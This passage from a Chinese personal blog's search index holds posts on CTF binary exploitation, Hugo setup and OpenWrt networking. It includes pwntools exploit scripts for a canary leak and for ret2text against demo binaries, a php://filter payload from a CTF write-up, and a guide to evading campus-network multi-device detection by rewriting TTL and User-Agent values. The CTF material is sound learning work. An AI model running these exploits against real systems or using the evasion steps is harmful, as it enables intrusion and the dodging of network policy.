Canary有一个特征：最低位为&rsquo;\0&rsquo;，这样做能够防止被print函数直接输出。上面代码的逻辑是不断循环，读取用户输入并输出，我们可以通过scanf溢出buffer，仅覆盖canary的最低一位，然后再输出buffer，这样就能够拿到Canary的值。第二次覆盖时用原来的值覆盖Canary（最低位为&rsquo;\0&rsquo;），再覆盖返回地址即可。
利用代码 #!/usr/bin/python # -*- coding: UTF-8 -*- from base import * # 我提取出了打pwn时的一些通用环节，放在了base.py里边 ru(b&#39;your choice: &#39;) sl(b&#39;1&#39;) sl(b&#39;a&#39; * 0x17 + b&#39;b&#39;) # 覆盖Canary的最低位 ru(b&#39;your choice: &#39;) sl(b&#39;2&#39;)	# 打印buffer ru(b&#39;b\n&#39;) canary = u64(rc(7).rjust(8, b&#39;\x00&#39;)) # 得到canary的值 info(&#39;canary: &#39;, canary) backdoor = elf.symbols[&#39;backdoor&#39;] # 后门函数的地址 sl(b&#39;1&#39;)	# 第二次写入，按原值覆盖canary，再加上返回地址 payload = b&#39;a&#39; * 0x18 + p64(canary) + b&#39;b&#39; * 8 + p64(backdoor) sl(payload) sl(b&#39;3&#39;) ia() base.py：
# -*- coding: UTF-8 -*- from pwn import * from sys import exit import argparse # setup pwntools context context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;] context.log_level = &#39;info&#39; # setup argparse parser = argparse.ArgumentParser() group = parser.add_mutually_exclusive_group() group.add_argument(&#34;-o&#34;, help=&#34;path to an elf file.&#34;, metavar=&#34;&lt;path to file&gt;&#34;) group.add_argument(&#34;-r&#34;, help=&#34;address of an remote machine.&#34;, metavar=&#34;&lt;ip:port&gt;&#34;) parser.add_argument(&#34;-v&#34;, help=&#34;debug log level, default level is error.&#34;, action=&#34;store_true&#34;) parser.add_argument(&#34;-g&#34;, help=&#34;start gdb to debug&#34;, action=&#34;store_true&#34;) parser.add_argument(&#34;-b&#34;, help=&#34;breakpoint. e.g. : *main+123 | 0x40115d&#34;, metavar=&#34;&lt;breakpoint&gt;&#34;) parser.add_argument(&#34;-l&#34;, help=&#34;specify which libc to preload&#34;, metavar=&#34;&lt;path to file&gt;&#34;) # resolve args args = parser.parse_args() verbose_enbale = args.v gdb_enable = args.g breakpoint = args.b elf_name = args.o remote_addr = args.r libc = args.l # error if not elf_name and not remote_addr: parser.print_usage() exit() # verbose loglevel if verbose_enbale == True: context.log_level = &#39;debug&#39; # if breakpoint not set, set it to main if not breakpoint: breakpoint = &#39;main&#39; # if libc not set, set env to empty if not libc: env = {} else: env = {&#39;LD_PRELOAD&#39;: libc} # local if elf_name: elf = ELF(elf_name) if gdb_enable == True: p = gdb.debug(elf.path, gdbscript=&#34;b &#34; + breakpoint, env=env) else: p = process(elf.path, env=env) # remote else: remote_addr = remote_addr.split(&#39;:&#39;) p = remote(remote_addr[0], remote_addr[1]) def sd(delim, data): return p.send(delim, data) def sa(delim, data): return p.sendafter(delim, data) def sl(data): return p.sendline(data) def sla(delim, data): return p.sendlineafter(delim, data) def rc(num): return p.recv(num) def rl(): return p.recvline() def ru(delims): return p.recvuntil(delims) def uu32(data): return u32(data.ljust(4, b&#39;\x00&#39;)) def uu64(data): return u64(data.ljust(8, b&#39;\x00&#39;)) def info(tag, addr): return log.info(tag + &#34; -&gt; &#34; + hex(addr)) def ia(): return p.interactive() 有时候不知道为什么会失败，多试几次即可
]]></content>
  </entry>
  
  <entry>
    <title>ret2text的原理及利用</title>
    <url>/post/exploiting-ret2xx.html</url>
    <categories><category>博客</category>
    </categories>
    <tags>
      <tag>PWN</tag>
      <tag>ret2xx</tag>
    </tags>
    <content type="html"><![CDATA[原理 ret2text 即控制程序执行程序本身已有的的代码 (.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。
这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。
——摘自CTF Wiki 基本 ROP - CTF Wiki (ctf-wiki.org) 示例 下面看一个简单的例子：不开启PIE，不开启Canary，利用ret2text跳转到程序中的后门函数。
// demo.c // gcc demo.c -o demo -fno-stack-protector -no-pie -Og #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; void backdoor() { printf(&#34;Now entering backdoor...\n&#34;); execve(&#34;/bin/bash&#34;, 0, 0); printf(&#34;Leaving backdoor...\n&#34;); } void func(){ char buffer[16]; scanf(&#34;%s&#34;, buffer); printf(&#34;Input: %s\n&#34;, buffer); } int main() { printf(&#34;Enter something...\n&#34;); func(); printf(&#34;Normal exit.\n&#34;); return 0; } checksec查看保护：
[*] &#39;/home/zero/src/pwn/stack-overflow/demo&#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 利用过程 func函数中含有危险函数scanf且并未限制长度，因此会造成缓冲区溢出。我们没有开启PIE和Canary保护，因此直接将返回地址覆盖为backdoor函数的地址即可。
gdb在func函数下断点：当前rsp保存的地址即为返回地址，也就是0x7fffffffdc98
buf在栈上的地址：0x7fffffffdc80
因此需要覆盖0x18个字节，然后再填入backdoor地址0x401156即可。exp如下：
# -*- coding: UTF-8 -*- from pwn import * elf = ELF(&#39;./demo&#39;) backdoor = elf.symbols[&#39;backdoor&#39;] p = process(elf.path) p.sendline(b&#39;a&#39; * 0x18 + p64(backdoor)) p.interactive() 运行，成功利用。
]]></content>
  </entry>
  
  <entry>
    <title>从Wordpress迁移到Hugo</title>
    <url>/post/migrating-to-hugo.html</url>
    <categories><category>博客</category>
    </categories>
    <tags>
      <tag>Hugo</tag>
      <tag>Wordpress</tag>
      <tag>waline</tag>
    </tags>
    <content type="html"><![CDATA[大概半年以前？我尝试过迁移到Hexo，但是有太多的问题没法解决：WP的文章在导出后整理图片路径很麻烦，也没想到很好的同步文章到服务器的方式，因此简单尝试后还是放弃了。
最近开始梳理过去的知识点，记录每周的学习内容，但是用WP写作的话每次都要开浏览器，不是很方便也不是WYSIWYG，修改文章也不如编辑Markdown文档方便，还得发布后再去查看，于是考虑换个方式写文章。本来是打算用Hexo的，因为主题很漂亮（Hexo-NexT主题的颜值是真的高啊🤤）。然后由于没法比较优雅地解决图片路径的问题，谷歌着谷歌着就发现了另外一个静态网页框架：Hugo，比Hexo 更流行 ，NexT主题的作者也在几年前切换到了Hugo，也基于Hugo开发了 Hugo-NexT 主题，因此我最后还是选择了使用Hugo作为博客框架。
花了两天时间，试过了N个Markdown编辑器，从Hexo转到了Hugo，趟过不少坑，总算是打通了写作即发布的流程，于是开篇文章记录一下。
Markdown编辑器的艰难选择 Typora不是开始收费了嘛，于是打算换个别的编辑器，在尝试过Joplin、Mark Text、Notable、Notion之后发现都不是很好用，而且对于文档中的图片保存路径自定义选项不够丰富（大坑之一，路径一旦不对图片就加载不出来，但是网页能正常显示的路径对于本地编辑器来说又是错的，体验很差），折腾了半天还是换回了Typora，真香😂
Hugo配置 hugo -D or hugo server? Hugo provides its own webserver which builds and serves the site. While hugo server is high performance, it is a webserver with limited options. Many run it in production, but the standard behavior is for people to use it in development and use a more full featured server such as Nginx or Caddy.
hugo server | Hugo (gohugo.io) 根据官方文档，hugo server不应该用于Production环境，使用正确的做法是使用hexo -D生成生成静态网页，然后配置Nginx实现Web服务。
nginx.conf server block如下：
server { listen 443; server_name hugo.izeroo.cn; root /home/zero/hugo/public; index index.html; } 经测试发现hugo server会有一些bug，文末链接不会随网站域名变化，就像下面这样
本文链接： http://localhost:1313/post/migrating-to-hugo.html 解决办法是使用下列参数启动hugo server
hugo server --appendPort=false -b &#34;https://hexo.izeroo.cn/&#34; 还有一个类似的bug，就是文末链接会变成
本文链接： http://hexo.izeroo.cn/hexo.izeroo.cn/post/migrating-to-hugo.html 在Gitter上得知是Hugo-NexT主题在develop分支引入的bug，目前develop分支已经修复 🐛 Fixed the local search engine can&rsquo;t find indexes file &amp; repose … · hugo-next/hugo-theme-next@f1fafdc (github.com) ：
图片如何正常显示？ 要让图片同时在本地和服务器上正常显示，最头疼的就是到底把图片放到哪里了，经过N小时的搜索和尝试，大致了解到大概这几种方式：
放到 static/image 放到 post/image/xx.png 放到 post/post_name/xx.png 折腾了半天最后还是最后一种比较符合人类直觉，当文章内需要插入图片时在post文件夹内新建post_name文件夹，图片放在里边，md文档使用index.md命名即可。如果不需要插入图片直接在post文件夹内放入文档即可。
自定义设置 见 &ldquo;config.yaml&rdquo;，说明很详细，按照提示自定义即可。
评论插件 giscus的风格和主题不太搭，最后还是选择了waline。
waline有很多种部署方式，我们既然有专用的主机那肯定是选择独立部署了。不过配置过程也是一波三折🤣
node.js版本过低 我使用的发行版是Debian bullseye，官方仓库内的node.js版本还停留在12.0，但是waline运行需要node版本&gt;14.0，因此需要手动安装node.js
nodesource/distributions: NodeSource Node.js Binary Distributions (github.com) Node.js v18.x:
# Using Ubuntu curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash - sudo apt-get install -y nodejs # Using Debian, as root curl -fsSL https://deb.nodesource.com/setup_18.x | bash - apt-get install -y nodejs 环境安装好之后即可部署waline，我使用的是 Waline 服务端一键独立部署解决方案 | Loclink Blog (tj520.top) ，默认的数据库用户是root，可以改一下。
还有个小问题需要留意一下，管理界面中文章的URL不对，因为.env文件中没有设置SITE_URL的值，默认用的就是waline服务端的URL，可以设置成自己博客的URL。
实现waline服务端自启动 waline部署好后，在服务端启动后执行下列命令即可
sudo npm install pm2 -g pm2 save pm2 startup 是时候解决文章同步了！ 一直以来都有这样的问题：在本地写好文章后如何同步到服务器？
push到github再由服务器clone下来？由于众所周知的原因在网络环境不好时此方案并不理想。
在本地写完再复制到服务端post文件夹？仅复制发生更改的文件还是复制并覆盖重复文件？如何追踪文件更改？比较麻烦。
那么有没有一种方法比较好的解决这个问题呢？有！那就是映射服务器目录到本地硬盘，这样一来编辑文章就和本地体验一样了，而且省去了上传的步骤。唯一的问题就是在没有网络的情况下服务会不可用，但是这种情况比较罕见可以单独处理，不成问题。
如何实现？ 使用sshfs-win-manager即可实现映射Linux服务器任意路径到网络硬盘，之后就可以使用Typora愉快地进行编辑啦🎈🎈🎈
Github项目见： evsar3/sshfs-win-manager: A GUI for SSHFS-Win (https://github.com/billziss-gh/sshfs-win) 使用很方便，界面也很漂亮，附一张软件截图：
]]></content>
  </entry>
  
  <entry>
    <title>Hugo的文件管理方案</title>
    <url>/post/Hugo%E7%9A%84%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86%E6%96%B9%E6%A1%88/</url>
    <categories><category>博客</category>
    </categories>
    <tags>
      <tag>Hugo</tag>
    </tags>
    <content type="html"><![CDATA[如果需要在文章中插入图片，则新建同名文件夹，在文件夹内保存文章为index.md，图片在md文档相同目录
参考： Hugo 的文件管理方案 | Jeremy&rsquo;s blog (isyin.cn) ]]></content>
  </entry>
  
  <entry>
    <title>Quine</title>
    <url>/post/quine/</url>
    <categories><category>博客</category><category>编程</category>
    </categories>
    <tags>
    </tags>
    <content type="html"><![CDATA[s = &#34;&#39;s = &#39; + repr(s) + &#39;\\nprint(&#39; + s + &#39;)&#39;&#34; print(&#39;s = &#39; + repr(s) + &#39;\nprint(&#39; + s + &#39;)&#39;) ]]></content>
  </entry>
  
  <entry>
    <title>关于 Hugo NexT 组织</title>
    <url>/about.html</url>
    <categories>
    </categories>
    <tags>
    </tags>
    <content type="html"><![CDATA[Hugo NexT 组织是由众多喜爱 NexT 主题及风格的世界各地友人共同组建而成，为的就是让这个主题继续在 Hugo 引擎中也能得到发扬光大，在此也欢迎你的加入！
我们的愿景 延续 NexT 经典的黑白调搭配，保持简单的易用性及强大的功能。
使用反馈 加入 GitHub Discussions 或 Gitter 在线讨论 🍻 GitHub Issues 提交错误报告 🐛 GitHub Feature 表新功能的想法 ✨ 同时国内用户也可加入 QQ 群交流： 604710815
]]></content>
  </entry>
  
  <entry>
    <title>世界，你好！</title>
    <url>/post/hello-world.html</url>
    <categories><category>博客</category>
    </categories>
    <tags>
      <tag>Hugo</tag>
      <tag>开始</tag>
    </tags>
    <content type="html"><![CDATA[ “使用 weight 关键字置顶文章。”
Hugo 是现今世界上最快的网站建设框架，也是最流行的开源静态站点生成器之一。 凭借其惊人的速度和灵活性，Hugo 让建设网站再次变得有趣起来。
快速开始 发表新文章 $ hugo new hello-world.md 更多信息： 内容格式 启动服务 $ hugo server 更多信息： Hugo 服务命令行 生成静态文件 $ hugo 更多信息： Hugo 建站 部署到服务器 $ hugo deploy 更多信息： Hugo 发布 祝你好运，相信你会喜欢上 Hugo 建站的旅程！
]]></content>
  </entry>
  
  <entry>
    <title>Linux pwn环境搭建</title>
    <url>/post/linux-pwn-env-setup/</url>
    <categories><category>博客</category><category>PWN</category>
    </categories>
    <tags>
    </tags>
    <content type="html"><![CDATA[1.安装pwntools
sudo apt-get update sudo apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential pip config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple python3 -m pip install --upgrade pip python3 -m pip install --upgrade pwntools echo export PATH=&#34;/home/`whoami`/.local/bin:\$PATH&#34; &gt;&gt; ~/.zshrc 2.安装pwngdb
cd ~/.local git clone https://github.com/pwndbg/pwndbg cd pwndbg ./setup.sh 3.安装splitmind（可选）
cd ~/.local git clone https://github.com/jerdna-regeiz/splitmind echo &#34;source $PWD/pwndbg/gdbinit.py&#34; &gt;&gt; ~/.gdbinit cat &lt;&lt; EOF &gt;&gt; ~/.gdbinit python import splitmind (splitmind.Mind() #.below(display=&#34;backtrace&#34;) .above(display=&#34;stack&#34;) .right(display=&#34;regs&#34;) .right(of=&#34;main&#34;, display=&#34;disasm&#34;) .show(&#34;legend&#34;, on=&#34;disasm&#34;) ).build() end EOF ]]></content>
  </entry>
  
  <entry>
    <title>记Openwrt+旁路由实现dns劫持分流加密</title>
    <url>/post/encrypting-dns/</url>
    <categories><category>博客</category>
    </categories>
    <tags>
      <tag>软路由</tag>
      <tag>DNS</tag>
    </tags>
    <content type="html"><![CDATA[需求： 劫持并加密所有明文DNS请求，对于大陆的IP直接使用阿里公共DNS(https://223.5.5.5/dns-query)实现加密解析，非大陆IP走1.1.1.1，实现对不同域名分流查询。
另外由于校园网域名解析结果都是内网IP，需要走UDP53协议才能被学校劫持，因此这部分DNS请求需要转发到114.114.114.114。
架构： Openwrt主路由 IP：192.168.1.1
OrangePi Zero 2旁路由 IP：192.168.1.2
在Openwrt内LAN口自定义DCHP Option，设置网关为旁路由IP，DNS服务器为主路由IP。
具体设置： 主路由 1.设置网关为192.168.1.2, DNS服务器为192.168.1.1 2.DHCP/DNS设置下设置DNS转发和重绑定保护白名单 转发到旁路由53端口也可，mosdns-cn可以取代systemd-resolved作为域名解析服务，并且能够加密请求。
补充：设置忽略解析文件，指定主路由接口DNS 如果没有设置忽略解析文件，发往192.168.1.1 的dns请求将不会被转发到旁路由！只有在主路由上发往127.0.0.1的dns请求会被转发到旁路由，太坑了！
设置忽略解析文件在我这边会莫名其妙自动取消，所以需要给每个接口指定DNS服务器为192.168.1.2
3.劫持所有明文DNS请求到主路由，防止DNS泄露 参考 [OpenWrt Wiki] DNS hijacking uci -q delete firewall.dns_int uci set firewall.dns_int=&#34;redirect&#34; uci set firewall.dns_int.name=&#34;Intercept-DNS&#34; uci set firewall.dns_int.src=&#34;lan&#34; uci set firewall.dns_int.src_dport=&#34;53&#34; uci set firewall.dns_int.proto=&#34;tcp udp&#34; uci set firewall.dns_int.target=&#34;DNAT&#34; uci set firewall.dns_int.dest=&#34;lan&#34; uci set firewall.dns_int.dest_ip=&#34;192.168.1.1&#34; uci commit firewall /etc/init.d/firewall restart 至此已经完成了主路由方面的设置。
主路由转发DNS查询给旁路由并缓存查询结果，对特定域名使用自定义DNS服务器查询。
旁路由 旁路由需要安装v2raya和mosdns-cn，github地址：
https://github.com/v2rayA/v2rayA https://github.com/IrineSistiana/mosdns-cn v2raya设置： 透明代理开启，IP转发和端口分享开启。
mosdns-cn配置： ./mosdns-cn -s :53 --local-upstream &#39;https://223.5.5.5/dns-query&#39; --local-ip &#39;geoip.dat:cn&#39; --local-domain &#39;geosite.dat:cn&#39; --remote-upstream &#39;https://1.1.1.1/dns-query&#39; --remote-domain &#39;geosite.dat:geolocation-!cn&#39; --log-file /tmp/mosdns.log -v 测试正常后可以以服务的形式安装
./mosdns-cn --service install -s :53 --local-upstream &#39;https://223.5.5.5/dns-query&#39; --local-ip &#39;geoip.dat:cn&#39; --local-domain &#39;geosite.dat:cn&#39; --remote-upstream &#39;https://1.1.1.1/dns-query&#39; --remote-domain &#39;geosite.dat:geolocation-!cn&#39; --log-file /tmp/mosdns.log -v ./mosdns-cn --service start 最后：
设置IP为静态，地址192.168.1.2，网关192.168.1.1，DNS服务器127.0.0.1
]]></content>
  </entry>
  
  <entry>
    <title>校园网多设备检测绕过</title>
    <url>/post/bypass-campus-network-detect/</url>
    <categories><category>未分类</category>
    </categories>
    <tags>
    </tags>
    <content type="html"><![CDATA[本文参考以下文章：
关于某大学校园网共享上网检测机制的研究与解决方案 (sunbk201.site) OpenWrt 编译步骤与命令详解教程 - P3TERX ZONE 目前主要的检测方式有以下几种
基于 HTTP 数据包请求头内的 User-Agent 字段的检测 HTTP数据包请求头存在一个叫做 User-Agent 的字段，该字段通常能够标识出操作系统类型，例如：
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Safari/537.36 Edg/89.0.774.45
Mozilla/5.0 (iPad; U; CPU OS 3_2_1 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Mobile/7B405
校园网会通过多次抓包检测此字段，若发现同时出现例如Windows NT 10.0 iPad 的字段，则判定存在多设备上网。
基于 IPv4 数据包包头内的 TTL 字段的检测 存活时间（英语：Time To Live，简写TTL）是电脑网络技术的一个术语，指一个数据包在经过一个路由器时，可传递的最长距离（跃点数）。每当数据包经过一个路由器时，其存活次数就会被减一。当其存活次数为0时，路由器便会取消该数据包转发，IP网络的话，会向原数据包的发出者发送一个ICMP TTL数据包以告知跃点数超限。其设计目的是防止数据包因不正确的路由表等原因造成的无限循环而无法送达及耗尽网络资源。这是一个比较有效且合理的检测技术，IPv4数据包下存在 TTL（Time To Live）这一字段，数据包每经过一个路由器（即经过一个网段），该TTL值就会减一。
不同的操作系统的默认 TTL 值是不同的，Windows 是 128， MAC OS/IOS、Linux 是 64。
因此如果我们自己接入路由器到校园网，我们的通过路由器的数据包会变为 127 或 63，一旦校园网抓包检测到这种数据包TTL不是128或64，就会判定为用户接入了路由器。
防共享上网检测的解决方案 对于校园网重重的检测，我们似乎已经不可能从终端级提出一个完美的解决方案，因此，下面的解决方案都是基于网关级的。简单来说，我们需要在路由器上动手脚。
路由器固件我们选择OpenWrt，这是一个开源的路由器系统，允许我们自定义其系统内核以及添加自定义插件。
不过我们需要自己交叉编译 OpenWRT，同学们需要有一定的功底。
基于 IPv4 数据包包头内的 TTL 字段的检测 应对思路很简单：修改 TTL 为固定值。
# 在 OpenWRT 路由器上安装必要的软件包 opkg update &amp;&amp; opkg install iptables-mod-ipopt kmod-ipt-ipopt 进入 OpenWRT 防火墙设置，在 自定义设置 中填入以下内容（ WAN 、LAN 口名称需根据实际情况进行更改 ） iptables -t mangle -A POSTROUTING -j TTL --ttl-set 64 点击 保存并应用 基于 HTTP 数据包请求头内的 User-Agent 字段的检测 使用 UA2F 修改 UA 这可能是最好的方案，UA2F 可以修改所有端口的数据包，而且性能不错，不过依旧需要编译。
具体参见： Zxilly/UA2F: Change User-agent to F-words on OpenWRT router to prevent being checked. (github.com)
验证方式： UA检测-HTTP (zhezhiyu.xyz)
]]></content>
  </entry>
  
  <entry>
    <title>极客大挑战 2019 Secret File Writeup</title>
    <url>/post/secret-file-writeup/</url>
    <categories><category>博客</category><category>CTF</category>
    </categories>
    <tags>
    </tags>
    <content type="html"><![CDATA[打开网站啥都没看到，Ctrl+A全选看到了隐藏的信息
点进去后可以看到另外一个页面，可以看到链接是指向action.php，但是点进去却看不到信息而且跳转到了另外一个url
应该是跳转了，用curl查看
果然可以看到302重定向，下面注释里藏着我们真正需要的页面
flag.php：
访问之后看不到需要的内容，看来不能直接拿到flag，但是可以利用php伪协议查看flag.php的源码
php://filter用于读取读取php文件源码内容(直接包含脚本格式文件会解析，无法直接获取文件源码)。用法：
index.php?file=php://filter/read=convert.base64-encode/resource=1.php
即可得到base64加密后的源码
解密得到flag
]]></content>
  </entry>
  
  <entry>
    <title>世界，您好！</title>
    <url>/post/2021/03/hello-world/</url>
    <categories><category>博客</category>
    </categories>
    <tags>
    </tags>
    <content type="html"><![CDATA[欢迎使用WordPress。这是您的第一篇文章。编辑或删除它，然后开始写作吧！
]]></content>
  </entry>
  
  <entry>
    <title></title>
    <url>/post/ddos/</url>
    <categories>
    </categories>
    <tags>
    </tags>
    <content type="html"><![CDATA[服务器被ddos攻击了（udp flood），已切换到Github Pages，请继续攻击
]]></content>
  </entry>
  
  <entry>
    <title>站点示例</title>
    <url>/flinks.html</url>
    <categories>
    </categories>
    <tags>
    </tags>
    <content type="html"><![CDATA[如想交换本站友情链接，请在评论区留下你的站点信息，格式参考如下：
- name: Hugo-NexT desc: Hugo NexT 官方预览网站。 avatar: https://hugo-next.eu.org/imgs/hugo_next_avatar.png link: https://hugo-next.eu.org ]]></content>
  </entry>
  
</search>